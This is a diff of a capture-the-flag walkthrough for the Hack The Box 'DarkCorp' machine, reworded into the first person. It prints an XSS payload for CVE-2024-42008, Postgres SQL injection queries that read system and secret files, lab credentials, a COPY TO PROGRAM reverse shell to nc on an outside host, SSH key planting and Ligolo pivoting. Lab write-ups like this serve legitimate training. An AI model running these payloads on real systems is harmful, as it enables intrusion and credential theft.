@@ -3,6 +3,7 @@
 Difficulty: Insane
 OS: Windows
 Category: Offensive
+Date: 2026-02-24T05:14:03.636Z
 
 ![93fba06a4780b65be5a5a4f9512b8e78.webp](93fba06a4780b65be5a5a4f9512b8e78.webp)
 
@@ -10,7 +11,7 @@ Category: Offensive
 
 ### Reconnaissance
 
-Using `nmap -sCV [target] -oN darkcorp-scans` 
+Using `nmap -sCV [target] -oN darkcorp-scans`
 
 ```python
 PORT   STATE SERVICE VERSION
@@ -24,25 +25,25 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-**NOTE: Remember to add the hosts “drib.htb” and the following hosts later**
+I add `drip.htb` to `/etc/hosts` and add further discovered hostnames as I go.
 
-Access the website as seen on port 80 by nmap
+I access the website as seen on port 80 by nmap
 
-Looking at the well designed website, if we scroll at the bottom we can see a *Contact Us* part
+At the bottom of the website, I find a section labeled **Contact Us**.
 
-You can try to test it out, and try sending a message without properly inputting an email *e.g. email@email.com*
+I can try to test it out, and try sending a message without properly inputting an email *e.g. email@email.com*
 
 ![image.png](image.webp)
 
 ### Drip Email
 
-Try to register and log in
+I try to register and log in
 
-This will take you to the dashboard.
+This will take me to the dashboard.
 
-Click on the *About* button and you’ll see its version number
+I click on the *About* button and I'll see its version number
 
-By searching through *Google* we can see there’s a [CVE-2024-42008]([https://securityvulnerability.io/vulnerability/CVE-2024-42008](https://securityvulnerability.io/vulnerability/CVE-2024-42008))
+By searching through *Google* I can see there’s a [CVE-2024-42008]([https://securityvulnerability.io/vulnerability/CVE-2024-42008](https://securityvulnerability.io/vulnerability/CVE-2024-42008))
 
 Here are some information about the vulnerability:
 
@@ -63,7 +64,7 @@ But there is also a condition here, it must be an HTML email:
 
 ### Testing the Payload
 
-Test the vulnerability by sending an email at yourself.
+I test the vulnerability by sending an email at myself.
 
 ```python
 <body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin)
@@ -74,13 +75,13 @@ Foo
 
 But the thing is, this did not work on me, it only returned an html code itself . Interpreting the payload as a string that is just a message.
 
-I tried going back to the homepage where we can send a message. Intercept the request using BurpSuite, then send another message.
+I return to the homepage's contact form and intercept another message with Burp Suite.
 
 ![image.png](image%204.webp)
 
-Unforetunately, the recipient is to *support@drip.htb*. Our **GOAL** is to read other user’s email witha *cross-site scripting* payload. 
+The recipient is `support@drip.htb`. My goal is to test whether a cross-site scripting payload can expose another user's email.
 
-To test, modify the *recipient* to your email. This will send the content to your email.
+For my initial test, I change the recipient to my own email address.
 
 ![image.png](image%205.webp)
 
@@ -190,21 +191,21 @@ except KeyboardInterrupt:
     print("\n[+] Stopping server.")
 ```
 
-Now run the python code and adjust the *uid* input starting from 1.
+Now I run the python code and adjust the *uid* input starting from 1.
 
-If the *uid* is 2, you’ll get this message.
+If the *uid* is 2, I'll get this message.
 
 ![image.png](image%207.webp)
 
-Then visit that link and it will give you access denied.
+Then I visit that link and it will give me access denied.
 
-Generate the reset token by going to [`http://dev-a3f1-01.drip.htb/forgot`](http://dev-a3f1-01.drip.htb/forgot) . Then use the python epxloit again and input the *uid* 3 or 4.
+I generate the reset token by going to [`http://dev-a3f1-01.drip.htb/forgot`](http://dev-a3f1-01.drip.htb/forgot) . Then, I use the python epxloit again and input the *uid* 3 or 4.
 
-You will get the reset token, visit the link, change the password, then login as use *bcase*
+I recover the reset token, follow the link, change the password, and log in as `bcase`.
 
 ### Foothold
 
-On the search bar, type anything and it will return an **SQL** error
+I enter a value in the search bar and receive an SQL error.
 
 ![image.png](image%208.webp)
 
@@ -214,7 +215,7 @@ This is an SQL error particularly **Postgres** with the following query:
 ''; SELECT pg_read_file('/etc/hosts', 0, 2000);
 ```
 
-For `/etc/passwd` 
+For `/etc/passwd`
 
 ```python
 ''; SELECT pg_read_file('/etc/hosts', 0, 2000);
@@ -226,25 +227,25 @@ _chrony:x:109:118:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
 ebelford:x:1002:1002:Eugene Belford:/home/ebelford:/bin/bash
 ```
 
-Query the database
+I query the database
 
 ```python
 ''; SELECT datname FROM pg_database;
 ```
 
-Query the Tables;
+I query the Tables;
 
 ```python
 ''; SELECT tablename FROM pg_tables;
 ```
 
-List Directories
+I list Directories
 
 ```python
 ''; SELECT * FROM pg_ls_dir('/var/log/postgresql/');
 ```
 
-Let’s get the password hashes in both **Users** and **Admins**
+I'll get the password hashes in both **Users** and **Admins**
 
 ```python
 ''; (SELECT password FROM "Users") --
@@ -260,13 +261,13 @@ d9b9ecbf29db8054b21f303072b37c4e
 d6ca3fd0c3a3b462ff2b83436dda495e
 ```
 
-We can look at the database logs, first view the version
+I can look at the database logs, first view the version
 
 ```python
 ''; SELECT version();
 ```
 
-Then, you can read the logs at:
+Then, I can read the logs at:
 
 ```python
 ''; SELECT pg_read_file('/var/log/postgresql/postgresql-15-main.log', 0, 100000000);
@@ -278,33 +279,33 @@ The hashes of the user *ebelford* can be found here
 ''; SELECT pg_read_file('/var/log/postgresql/postgresql-15-main.log.1', 0, 100000000);
 ```
 
-Then you can crack the hash at [crackstation]([https://crackstation.net/](https://crackstation.net/))
+Then I can crack the hash at [crackstation]([https://crackstation.net/](https://crackstation.net/))
 
-In our attacker’s machine connect to the ssh:
+From my machine, I connect over SSH:
 
 ```python
 sshpass -p'ThePlague61780' ssh -o StrictHostKeyChecking=no ebelford@drip.htb
 ```
 
-We find the backups from postgres from the database user at:
+I find the backups from postgres from the database user at:
 
 ```python
 ls -la /var/backups | grep postgres
 ```
 
-In order to view the following directory we need a postgres user. Find the database details at
+In order to view the following directory I need a postgres user. I find the database details at
 
 ```python
 ls -la /var/www/html/dashboard/
 ```
 
-You will see a **.env** file, view it and you will see the juicy contents of it. Alternatively, you can view this file using an SQL query with:
+I'll see a **.env** file, view it and I'll see the juicy contents of it. Alternatively, I can view this file using an SQL query with:
 
 ```python
 ''; SELECT pg_read_file('/var/www/html/dashboard/.env', 0, 10000000);
 ```
 
-You will find the contents
+I'll find the contents
 
 ```python
 # True for development, False for production
@@ -341,22 +342,22 @@ MAIL_PASSWORD = None
 MAIL_DEFAULT_SENDER = 'support@drip.htb'
 ```
 
-We can get a shell out of this info. In your attacker’s machine, you can use `metasploit` or `rlwrap nc -lnvp 4455` depends on your preference, just setup a listener.
+I can get a shell out of this info. In my attacker’s machine, I can use `metasploit` or `rlwrap nc -lnvp 4455` depends on my preference, just setup a listener.
 
-Then, in the victim’s machine in ssh, connect to the database with:
+From the target's SSH session, I connect to the database:
 
 ```python
 PGPASSWORD=2Qa2SsBkQvsc psql -h localhost -U dripmail_dba -d dripmail
 ```
 
-You will be inside the database, then input the command to establish a bounce shell
+In the database session, I run the command that starts the reverse shell:
 
 ```python
 COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat
 /tmp/f|bash -i 2>&1|nc 10.10.14.15 4455 >/tmp/f';
 ```
 
-Then put your ssh public key in the victim’s machine. Remember to replace the contents of the *echo* with your ssh public key. 
+I place my SSH public key on the target, substituting my own key in the `echo` command:
 
 ```python
 mkdir -p ~/.ssh  
@@ -365,19 +366,19 @@ AAAAC3NzaC1lZDI1NTE5AAAAIGPqkrmvSthuwL/gpIhNJ7ioSieOV53BZH4bMDKalyMF
 kiberdruzhinnik@vm" > ~/.ssh/authorized_keys
 ```
 
-You can generate your own public key with this in your attacker’s machine
+I can generate my own public key with this in my attacker’s machine
 
 ```python
 ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519
 ```
 
-Then ssh to the attacker’s machine with the user *postgres* you will have to enter your passphrase if there are any
+I connect to the target over SSH as `postgres`, supplying my key's passphrase if needed.
 
 ```python
 ssh postgres@drip.htb
 ```
 
-Look in the backups directory again you will see a file `dev-dripmail.old.sql.gpg` we can decrypt it with **gpg**
+I look in the backups directory again I'll see a file `dev-dripmail.old.sql.gpg` I can decrypt it with **gpg**
 
 ```python
 gpg homedir /var/lib/postgresql/.gnupg pinentry-mode=loopback passphrase
@@ -385,7 +386,7 @@ gpg homedir /var/lib/postgresql/.gnupg pinentry-mode=loopback passphrase
 /var/backups/postgres/dev-dripmail.old.sql
 ```
 
-Then look inside its content we will get the user **victor.r**
+Then I look inside its content I'll get the user **victor.r**
 
 ```python
 1       bcase   dc5484871bc95c4eab58032884be7225        bcase@drip.htb
@@ -393,21 +394,21 @@ Then look inside its content we will get the user **victor.r**
 3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb
 ```
 
-Crack the hash passwords for *victor.r* then you’ll get its password.
+I crack the hash passwords for *victor.r* then I'll get its password.
 
 ### Pivoting
 
-I did countless of trial and errors when pivoting, the first thing to do is to establish a proxy. I tried using chisel with socks connection, metasploit autoroute with socks connection but to no avail. What I used is **ligolo**. Just *scp* the agent to the victim and your proxy to yourself. This will allow us to scan the internal network and service detection more.
+After several unsuccessful attempts with Chisel and Metasploit SOCKS routing, I use Ligolo-ng. I transfer its agent to the target and run the proxy on my machine so I can reach the internal network.
 
-You can download the ligolo here [Ligolo](https://github.com/Nicocha30/ligolo-ng/releases)
+I can download the ligolo here [Ligolo](https://github.com/Nicocha30/ligolo-ng/releases)
 
-In your attacker machine 
+In my attacker machine
 
 ```python
 ./proxy -selfcert -laddr 0.0.0.0:11601
 ```
 
-Modify your interface for this to work
+I modify my interface for this to work
 
 ```python
 sudo ip tuntap add user $(whoami) mode tun ligolo
@@ -417,7 +418,7 @@ sudo ip link set ligolo up
 sudo ip addr add 172.16.20.100/24 dev ligolo
 ```
 
-If there are still errors, please refer to *online research* or *openai*. These are the core configurations
+These are the core interface and route settings I used while troubleshooting the tunnel.
 
 Then on the victim machine
 
@@ -425,7 +426,7 @@ Then on the victim machine
 ./agent -connect 10.10.14.15:11601 -ignore-cert
 ```
 
-Then on your ligolo proxy
+Then on my ligolo proxy
 
 ```python
 session # select the victim's session
@@ -435,7 +436,7 @@ start
 sudo ip route add 172.16.20.0/24 dev ligolo
 ```
 
-You can then nmap scan the 2 address we found earlier, here are the results.
+I can then nmap scan the 2 address I found earlier, here are the results.
 
 ```python
 Nmap scan report for 172.16.20.1
@@ -571,19 +572,19 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 79.20 seconds
 ```
 
-Then let’s look at `172.16.20.2` 
+Then I'll look at `172.16.20.2`
 
 ![image.png](image%209.webp)
 
-We can access port 5000 with the credentials of `victor.r:victor1gustavo@#`
+I can access port 5000 with the credentials of `victor.r:victor1gustavo@#`
 
 ![image.png](image%2010.webp)
 
-Let’s enumerate the domain using `bloodhound-python` 
+I'll enumerate the domain using `bloodhound-python`
 
-Add `172.16.20.2 WEB-01 WEB-01.darkcorp.htb` on your `/etc/hosts` 
+I add `172.16.20.2 WEB-01 WEB-01.darkcorp.htb` on my `/etc/hosts`
 
-We will use `proxychains4` to dump the domain for bloodhound
+I'll use `proxychains4` to dump the domain for bloodhound
 
 ```python
 $ sshpass -p'ThePlague61780' ssh -o StrictHostKeyChecking=no -D 1080
